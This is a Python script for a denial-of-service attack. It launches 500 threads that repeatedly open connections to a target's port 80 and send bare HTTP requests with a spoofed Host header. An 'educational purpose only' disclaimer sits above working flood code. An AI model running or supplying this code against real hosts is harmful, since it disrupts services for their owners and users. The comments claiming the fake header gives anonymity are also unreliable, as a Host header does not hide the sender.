import threading
import socket
'''

DDos is illegal so such a script should only be used in personal network or if you have permission to use it 
script is not optimal since it's slow as it's a python script also it's lightweight as I'm not sending any heavy
data additionally python doesn't have real multithreading since I'm using Cpython due to GIL. The script is for educational
purpose only

'''

target = 'IP address of DDos victim'
# depending on type of service denial port number changes
port = 80
# fake ip for anonymity but must be used along with an anonymizer not by itself
fake_ip = '182.21.20.32'
connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("Get /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        '''' 
        check validity of script, will be printed every 500 devices but for real world application not ideal as
        it slows down script
        
        '''
        global connected
        connected += 1
        if connected % 500 == 0:
            print(connected)

for i in range(500):
    # utilize multithreading to send from multiple devices
    thread = threading.Thread(target=attack)
    thread.start()
